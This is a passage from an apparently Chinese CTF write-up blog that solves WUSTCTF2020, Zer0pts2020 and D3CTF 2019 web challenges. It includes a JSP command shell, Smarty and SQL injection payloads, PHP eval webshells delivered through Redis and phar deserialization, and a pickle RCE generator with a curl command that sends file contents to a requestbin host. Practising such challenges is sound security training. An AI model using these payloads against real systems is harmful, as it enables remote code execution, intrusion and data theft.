class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(geq_expression, l, r)</span>:</span></span><br><span class="line">    eq_expression = geq_expression.replace(<span class="string">'&gt;='</span>, <span class="string">'=='</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> (r - l) &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">for</span> mid <span class="keyword">in</span> range(l, r + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> query(eq_expression.format(num=mid)):</span><br><span class="line">                    <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'NOT FOUND'</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> query(geq_expression.format(num=mid)):</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag_len = binary_search("len(open('/flag').read())&gt;=&#123;num&#125;", 0, 100)</span></span><br><span class="line">flag_len = <span class="number">50</span></span><br><span class="line">print(<span class="string">'flag length: %d'</span> % flag_len)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'flag&#123;cef388f4-71a6-41d9-b0c1-3dcd5e3'</span></span><br><span class="line"><span class="keyword">while</span> len(flag) &lt; flag_len:</span><br><span class="line">    c = binary_search(<span class="string">"ord(open('/flag').read()[%d])&gt;=&#123;num&#125;"</span> % len(flag), <span class="number">0</span>, <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">if</span> c:   <span class="comment"># the bs may fail due to network issues</span></span><br><span class="line">        flag += chr(c)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="wustctf2020train-yourself-to-be-godly">[WUSTCTF2020]Train Yourself To Be Godly</span></h4><p> 打开页面是tomcat，影响较大的有三个历史漏洞，这里考的是<strong>弱口令 &amp;&amp; 后台getshell漏洞</strong></p>
<p>利用 <code>..;/</code>可以穿越目录，从而返回上一层，<code>/..;/manager/html</code>进入管理页面，弱密码<code>tomcat:tomcat</code>登录后台，但是直接上传war包由于路径问题导致上传失败。</p>
<p><img src="https://i.loli.net/2020/04/03/LmSRu4fcEXvW8ZD.png" alt="Snipaste_2020-04-03_12-48-56.png"></p>
<p>我们当前目录为<code>examples</code>，少了一个目录穿越<code>/..;/</code>，加上之后返回401，加上基础认证，返回403，即权限不够</p>
<p>查看basic认证的返回包</p>
<p><img src="https://i.loli.net/2020/04/03/hup76Ka8nRSfB9s.png" alt="Snipaste_2020-04-03_11-48-04.png"></p>
<p>发现有一个<code>Path=/manager</code>，</p>
<p><strong>方法一</strong></p>
<p>官方wp是直接将传wp时的<code>/examples</code>修改为<code>/manager</code>，这样cookie的Path就对应了</p>
<p><img src="https://i.loli.net/2020/04/03/szHGSQAyn7weLER.png" alt="Snipaste_2020-04-03_20-18-19.png"></p>
<p>加上basic认证，出现403，然后替换新的setCookie值也还是403，遂作罢</p>
<p><strong>方法二</strong></p>
<p>和Mrkaixin师傅讨论了下，修改响应包使<code>Path=/..;/manger</code></p>
<p><img src="https://i.loli.net/2020/04/03/nagAFWdTQuUmC8r.png" alt="Snipaste_2020-04-03_20-35-26.png"></p>
<p>或者可以直接F12修改Cookie</p>
<p><img src="https://i.loli.net/2020/04/03/gkPVxbNFGzUsZrp.png" alt="TIM图片20200403205537.png"></p>
<p>传war包</p>
<p><img src="https://i.loli.net/2020/04/03/SAZHRkq671jEVGy.png" alt="Snipaste_2020-04-03_21-00-06.png"></p>
<p>冰蝎</p>
<p><img src="https://i.loli.net/2020/04/03/qIrw9RXeLTcYmVW.png" alt="Snipaste_2020-04-03_20-46-23.png"></p>
<hr>
<h4><span id="wustctf2020easyweb">[WUSTCTF2020]easyweb</span></h4><p>上传文件之后存在下载操作，任意文件读取漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;download?file&#x3D;3e6916d2-645a-4d6a-8adf-9eff8ad74d89.jpeg</span><br></pre></td></tr></table></figure>

<p>中间还报错得到了路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;uploads&#x2F;null (No such file or directory)</span><br></pre></td></tr></table></figure>

<p><code>/uploads</code>目录无法直接访问，但是可以配合幽灵猫漏洞文件包含</p>
<blockquote>
<p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487" target="_blank" rel="noopener">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a> </p>
</blockquote>
<p>写个<code>1.jsp</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(<span class="string">"Executing command"</span>);</span><br><span class="line">Process p = Runtime.getRuntime().exec(<span class="string">"ls /"</span>);</span><br><span class="line">OutputStream os = p.getOutputStream();</span><br><span class="line">InputStream in = p.getInputStream();</span><br><span class="line">DataInputStream dis = <span class="keyword">new</span> DataInputStream(in);</span><br><span class="line">String disr = dis.readLine();</span><br><span class="line"><span class="keyword">while</span> ( disr != <span class="keyword">null</span> ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr = dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>能成功执行命令，但是回显有点奇怪，反弹shell也失败，jsp不能使用``包裹命令直接带出，最后用@Mrkaixin的木马反弹shell成功</p>
<hr>
<p>###################04/10</p>
<h4><span id="zer0pts2020phpnantokaadm">[Zer0pts2020]phpNantokaAdm</span></h4><p>给了源码</p>
<p><code>index.php</code></p>
<p><img src="https://i.loli.net/2020/04/10/AFEOgWTtdUxVMZP.png" alt="Snipaste_2020-04-10_12-22-47.png"></p>
<p>sqlite数据库，存在明显的sql注入，跟进<code>is_vaild()</code></p>
<p><img src="https://i.loli.net/2020/04/10/So5rJf6M4Ad2a1H.png" alt="Snipaste_2020-04-10_12-24-25.png"></p>
<p>构造形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE $table (dummy1 TEXT,dummy2 TEXT,&#96;$column&#96; $type);</span><br></pre></td></tr></table></figure>

<p>=&gt;</p>
<blockquote>
<p>本地测试可以利用<a href="https://www.phpliteadmin.org/download/" target="_blank" rel="noopener">phpliteadmin</a></p>
</blockquote>
<p>在执行sql语句前出现了其他查询</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$pdo-&gt;query(<span class="string">'CREATE TABLE `'</span> . FLAG_TABLE . <span class="string">'` (`'</span> . FLAG_COLUMN . <span class="string">'` TEXT);'</span>);</span><br><span class="line">$pdo-&gt;query(<span class="string">'INSERT INTO `'</span> . FLAG_TABLE . <span class="string">'` VALUES ("'</span> . FLAG . <span class="string">'");'</span>);</span><br><span class="line">$pdo-&gt;query($sql);</span><br></pre></td></tr></table></figure>

<p>1、在<strong>创建表</strong>时可以用<code>as</code>来复制另一个表中的数据。这里我们就可以用<code>as select sql from sqlite_master</code>来复制<code>sqlite_master</code>的<code>sql</code>字段。 </p>
<p>2、 双引号被过滤了，在sqlite中可以用中括号<code>[]</code>来代替。 </p>
<p>3、使用<code>as</code>+表别名是指在一个特定的 SQLite 语句中重命名表。重命名是临时的改变，在数据库中实际的表的名称不会改变。 列别名用来为某个特定的 SQLite 语句重命名表中的列。 和其他数据库类似，别名的关键字<code>as</code>可以被省略 </p>
<p>构造如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE a as select sql as[ (dummy1 TEXT, dummy2 TEXT, &#96;]from sqlite_master;&#96; 2);</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/10/DGPsC8Sv9oZlVBK.png" alt="Snipaste_2020-04-10_14-08-20.png"></p>
<p>=&gt;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name&#x3D;a as select sql as[&amp;columns[0][name]&#x3D;]from sqlite_master;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/10/Mdtm1iqlVuwpS3e.png" alt="Snipaste_2020-04-10_13-38-46.png"></p>
<p>第二次查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name&#x3D;a as select flag_2a2d04c3 as[&amp;columns[0][name]&#x3D;]from flag_bf1811da;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="zer0pts2020musicblog">[Zer0pts2020]musicblog</span></h4><p>查看源码，发现flag在<code>worker.js</code>中设置在浏览器UA中</p>
<p><img src="https://i.loli.net/2020/04/10/TrBQgd87snlKWc9.png" alt="Snipaste_2020-04-10_14-48-18.png"></p>
<p>admin会自动点击<code>#like</code>标签</p>
<p>观察插入content的地方</p>
<p><img src="https://i.loli.net/2020/04/10/Z6d2enr93xELhYD.png" alt="Snipaste_2020-04-10_14-29-52.png"></p>
<p>而这个<code>strip_tags()</code>存在bug</p>
<p><code>strip_tags site:bugs.php.net</code></p>
<blockquote>
<p><a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a> </p>
</blockquote>
<p><code>&lt;audio&gt;</code>标签受CSP限制，这里可以利用bug构造一个<code>&lt;a&gt;</code>标签绕过CSP的限制</p>
<p>构造<code>&lt;a/udio id=like href=//http.requestbin.buuoj.cn/x6l5fvx6&gt;aa</code></p>
<p>自己测试下成功跳转，然后等待admin点击即可</p>
<hr>
<h4><span id="zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?</span></h4><p>源码</p>
<p><img src="https://i.loli.net/2020/04/10/Lcq9Dki4Txrb6uX.png" alt="Snipaste_2020-04-10_15-07-39.png"></p>
<p> <code>$_SERVER[&#39;PHP_SELF&#39;]</code>表示当前执行脚本的文件名，</p>
<p>构造<code>/index.php/config.php?source</code></p>
<p>但是这里正则匹配<code>/config\.php\/*$/i</code></p>
<p>匹配形式如<code>config.php///</code>的字符串</p>
<p>搜索<code>basename()</code>的bug</p>
<p><code>basename site:bugs.php.net</code></p>
<blockquote>
<p><a href="https://bugs.php.net/bug.php?id=62119" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=62119</a> </p>
</blockquote>
<p><code>basename()</code>会丢弃文件名中非ASCII字符。</p>
<p>加在结尾，可以成功绕过正则<code>/index.php/config.php/%ff?source</code></p>
<hr>
<h4><span id="zer0pts2020urlapp">[Zer0pts2020]urlapp</span></h4><blockquote>
<p><a href="https://www.anquanke.com/post/id/200927" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200927</a> </p>
</blockquote>
<p>url缩短，用redis存储</p>
<p>查看redis配置文件</p>
<p><img src="https://i.loli.net/2020/04/10/luZHzXQ2r4govGq.png" alt="Snipaste_2020-04-10_16-16-28.png"></p>
<p>禁用了一些指令</p>
<p>处理过程</p>
<p><img src="https://i.loli.net/2020/04/10/jcWJePmDI9pvlao.png" alt="Snipaste_2020-04-10_16-19-25.png"></p>
<p>如果是POST请求，对传入的url进行正则检测，调用<code>set()</code>函数</p>
<p><img src="https://i.loli.net/2020/04/10/R2foi9Uwq4LsKeN.png" alt="Snipaste_2020-04-10_16-31-32.png"></p>
<p>相当于发送redis命令，这里存在CRLF注入，直接操作redis。</p>
<p>比如常见的些shell或者定时任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">config set dir &#x2F;var&#x2F;www</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>但是常用的redis执行被禁用，比如<code>CONFIG</code></p>
<p>参考wp，这里找到了<code>BITOP</code>命令，可以对key做位运算，并把结果保存到新key里。 </p>
<blockquote>
<p><a href="https://redis.io/commands/bitop" target="_blank" rel="noopener">https://redis.io/commands/bitop</a> </p>
</blockquote>
<p>构造16位符合条件的文件名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET tmp 1</span><br><span class="line">BITOP XOR abababababababab flag tmp</span><br></pre></td></tr></table></figure>

<p>即写入<code>abababababababab</code>中</p>
<p><img src="https://i.loli.net/2020/04/10/cnbIqUS27PLYlNg.png" alt="Snipaste_2020-04-10_16-20-13.png"></p>
<p><img src="https://i.loli.net/2020/04/10/SD1zpF7GAEX8wM3.png" alt="Snipaste_2020-04-10_17-06-57.png"></p>
<p>一开始q访问出现404</p>
<p>这里的思路是利用<code>setbit</code>把某一位变成<code>?</code> 或者<code>/</code></p>
<p><code>1</code>和<code>f</code>异或得到<code>W</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">W&#x3D;&gt;01010111</span><br><span class="line">?&#x3D;&gt;00111111</span><br></pre></td></tr></table></figure>

<p>使用<code>setbit</code>讲<code>W</code>转化为<code>?</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SET tmp 1</span><br><span class="line">BITOP XOR abababababababab flag tmp</span><br><span class="line">setbit abababababababab 1 0</span><br><span class="line">setbit abababababababab 2 1</span><br><span class="line">setbit abababababababab 4 1</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/10/6BsSuMCaQxVKmEh.png" alt="Snipaste_2020-04-10_17-16-25.png"></p>
<hr>
<h4><span id="zer0pts2020notepad">[Zer0pts2020]notepad</span></h4><p>flask框架</p>
<p>处理404页面存在明显的模板注入</p>
<p><img src="https://i.loli.net/2020/04/10/kl1h3jV7JUvC2QB.png" alt="Snipaste_2020-04-10_17-45-01.png"></p>
<p>跟进<code>valid_url()</code></p>
<p><img src="https://i.loli.net/2020/04/10/tRY2sKNo3wZTAB7.png" alt="Snipaste_2020-04-10_19-07-27.png"></p>
<p>长度限制为16，理论上只能读取一些配置常量</p>
<p><img src="https://i.loli.net/2020/04/10/uetERnA3HwIkv7T.png" alt="Snipaste_2020-04-10_18-20-45.png"></p>
<p>利用ssti读取config中的<code>secret_key</code>，配合flask的session伪造</p>
<p><strong>ssti</strong></p>
<p><img src="https://i.loli.net/2020/04/10/QBl23jJvPtY9SH5.png" alt="Snipaste_2020-04-10_19-24-07.png"></p>
<p>得到<code>&#39;SECRET_KEY&#39;: b&#39;\xcb\xcf\x89\x82\x9e\xfed\x82\xcck\x98\xa8\xaf\x956\xf8&#39;</code></p>
<p><strong>pickle反序列化RCE</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import _pickle as cPickle</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">COMMAND &#x3D; sys.argv[1]</span><br><span class="line">class PickleRce(object):</span><br><span class="line">	def __reduce__(self):</span><br><span class="line">		import os</span><br><span class="line">		return (os.system,(COMMAND,))</span><br><span class="line">print base64.b64encode(base64.b64encode(cPickle.dumps(PickleRce())))</span><br></pre></td></tr></table></figure>

<p>注意这里要base64编码两次</p>
<p>=&gt;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@glotozz ~]# python3 1.py &quot;curl http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;rswxb2rs?a&#x3D;\&#96;cat flag.txt |base64\&#96;&quot;</span><br><span class="line">b&#39;Z0FOamNHOXphWGdLYzNsemRHVnRDbkVBV0VZQUFBQmpkWEpzSUdoMGRIQTZMeTlvZEhSd0xuSmxjWFZsYzNSaWFXNHVZblYxYjJvdVkyNHZjbk4zZUdJeWNuTS9ZVDFnWTJGMElHWnNZV2N1ZEhoMElIeGlZWE5sTmpSZ2NRR0ZjUUpTY1FNdQ&#x3D;&#x3D;&#39;</span><br></pre></td></tr></table></figure>

<p><strong>flask的session伪造</strong></p>
<p>原始数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;&#123;&quot;savedata&quot;:&#123;&quot; b&quot;:&quot;Z0FOZGNRQjljUUVvV0FRQUFBQmtZWFJsY1FKWUV3QUFBREl3TWpBdE1EUXRNVEFnTVRFNk5USTZNak54QTFnRUFBQUFkR1Y0ZEhFRVdBQUFBQUJ4QlZnRkFBQUFkR2wwYkdWeEJsZ0tBQUFBS2s1bGR5Qk9iM1JsS25FSGRXRXU&#x3D;&quot;&#125;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>伪造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -t &#39;&#123;&quot;savedata&quot;:&#123;&quot; b&quot;:&quot;Z0FOamNHOXphWGdLYzNsemRHVnRDbkVBV0VZQUFBQmpkWEpzSUdoMGRIQTZMeTlvZEhSd0xuSmxjWFZsYzNSaWFXNHVZblYxYjJvdVkyNHZjbk4zZUdJeWNuTS9ZVDFnWTJGMElHWnNZV2N1ZEhoMElIeGlZWE5sTmpSZ2NRR0ZjUUpTY1FNdQ&#x3D;&#x3D;&quot;&#125;&#125;&#39; -s &#39;\xcb\xcf\x89\x82\x9e\xfed\x82\xcck\x98\xa8\xaf\x956\xf8&#39;</span><br></pre></td></tr></table></figure>

<p>没成功，思路应该差不多，有空再看（咕</p>
<hr>
<h4><span id="d3ctf-2019easyweb">[D3CTF 2019]EasyWeb</span></h4><p>基于<code>codeigniter</code>框架</p>
<p><code>application/controllers/User.php</code></p>
<p><img src="https://i.loli.net/2020/04/11/Lkvxw82gRsbtjI9.png" alt="Snipaste_2020-04-10_22-10-44.png"></p>
<p>跟进<code>get_view()</code></p>
<p><img src="https://i.loli.net/2020/04/11/j3Y9eLMKrFBz1xR.png" alt="Snipaste_2020-04-10_22-12-30.png"></p>
<p>这里的方法调用顺序存在明显的逻辑错误可以二次sql注入，再配合smarty模板注入</p>
<p><code>username</code>处可以时间盲注爆库，但是最后发现flag不在数据库中</p>
<p><code>templates/index/koocola.tpl</code>中提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hi, &#123;&#123;$username.username&#125;&#125;, hope you have a good experience in this ctf game</span><br><span class="line">&lt;br&gt;</span><br><span class="line">you must get a RCE Bug in this challenge</span><br></pre></td></tr></table></figure>

<p>联合注入+smarty模板注入</p>
<p>根据例子注意这里需要两对<code>{}</code>来渲染</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$smarty.version&#125;&#125;</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">g&#39;un&#123;ion se&#123;lect 0x7B7B24736D617274792E76657273696F6E7D7D#</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/11/2yeaTlbnqZX9YtI.png" alt="Snipaste_2020-04-10_23-13-23.png"></p>
<p><code>3.1.33</code>版本，可以使用内置函数<code>{php}</code>实现RCE</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;php&#125;&#125;eval($_GET[cmd]);&#123;&#123;&#x2F;php&#125;&#125;</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">g&#39; u&#123;nion s&#123;elect 0x7b7b7068707d7d6576616c28245f4745545b636d645d293b7b7b2f7068707d7d#</span><br></pre></td></tr></table></figure>

<p>如果<code>{php}</code>被弃用，因为这里存在文件上传，还可以尝试配合<code>{include}</code>去RCE</p>
<hr>
<p>#######################04/11</p>
<h4><span id="d3ctf-2019ezupload">[D3CTF 2019]EzUpload</span></h4><p>给了源码</p>
<p><code>__construct()</code>中新建了目录</p>
<p>三个check方法</p>
<p><img src="https://i.loli.net/2020/04/11/Uy4fq5dSeT2Cm7N.png" alt="Snipaste_2020-04-11_08-41-13.png"></p>
<p><img src="https://i.loli.net/2020/04/11/bzp87eIoHsZuU1E.png" alt="Snipaste_2020-04-11_08-47-24.png"></p>
<p>经过check后文件写入。文件内容从传入的url读取，一般情况下是允许读取远程文件的，因此可以在vps上设置文件。</p>
<p><code>checkdir()</code>检查了<code>$this-&gt;userdir</code>，先放着</p>
<p><code>checkurl()</code>禁止了url出现<code>php|file</code>，防止使用两种伪协议读取本地文件，除了vps上设置文件还可以使用<code>data://</code>协议</p>
<p><code>checkext()</code>禁止了<code>filename</code>出现<code>..</code>、<code>/</code>、<code>ph</code>，可以想到<code>.htaccess</code></p>
<p>在<code>upload()</code>中还对文件内容进行了过滤，</p>
<p>下面两种常用的无法使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br><span class="line">php_value auto_prepend_file &quot;&#x2F;home&#x2F;fdipzone&#x2F;header.php&quot;</span><br></pre></td></tr></table></figure>

<p>可以使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure>

<p>尝试写入<code>.htaccess</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/11/7qoXwpbVFjdy1s2.png" alt="Snipaste_2020-04-11_09-24-04.png"></p>
<p><code>.htaccess</code>写入成功，但<code>__destruct()</code>中的<code>file_put_contents()</code>写入失败</p>
<p>排查下是路径的问题，在<code>__destruct()</code>中加一个<code>var_dump(system(&#39;pwd&#39;));</code></p>
<p>得到<code>__destruct()</code>的默认目录是<code>/</code>，因此没有写入权限。上面我们虽然成功写入了<code>.htaccess</code>，但是仍然无法写入php格式的文件，除非绕过<code>upload()</code>中的过滤。</p>
<p>可以利用phar反序列化自动触发<code>__destruct()</code>中的<code>file_put_contents()</code>，并且phar可以进行gzip压缩，从而绕过对一些字符的检查。</p>
<p>第一步，寻找phar反序列化触发点，可以通过<code>upload()</code>方法中的 <code>$content = file_get_contents($this-&gt;url,NULL,NULL,0,2048);</code></p>
<p>第二步，获取<code>upload/</code>目录的绝对路径，可以通过<code>__destruct()</code>中的 <code>echo $string;</code> 触发<code>__toString()</code>，打印<code>__DIR__</code></p>
<p><strong>先获取绝对路径</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> $userdir;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">'../'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> dir();</span><br><span class="line">    $a -&gt; userdir = <span class="keyword">new</span> dir();</span><br><span class="line">    <span class="comment">// var_dump($a);</span></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $phar-&gt;setMetadata($a); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>重命名为1，进行gzip压缩并放到vps上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;174.1.244.41&#x2F;1.gz&amp;filename&#x3D;gqyy.phar.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/11/zyFIR9MhWPwr5qY.png" alt="Snipaste_2020-04-11_11-57-17.png"></p>
<p>绝对路径为<code>/var/www/html/6c19fec38725c11d/upload/76d9f00467e5ee6abc3ca60892ef304e</code></p>
<p><strong>写入php格式的<code>txt</code>文件</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> $userdir;</span><br><span class="line">      <span class="keyword">public</span> $filename;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">'/var/www/html/52aee03d2e0f909e/upload/76d9f00467e5ee6abc3ca60892ef304e/gqy'</span>;<span class="comment">//这里不需要加后缀</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">'aa&lt;?php phpinfo();eval($_POST[cmd]);?&gt;aaaaaaa'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> dir();</span><br><span class="line">    <span class="comment">// var_dump($a);</span></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $phar-&gt;setMetadata($a); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>经过gzip压缩之后仍有可能出现被过滤的字符，因此可以通过添加一些额外的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;174.1.244.41&#x2F;4.gz&amp;filename&#x3D;g.phar.gz</span><br></pre></td></tr></table></figure>

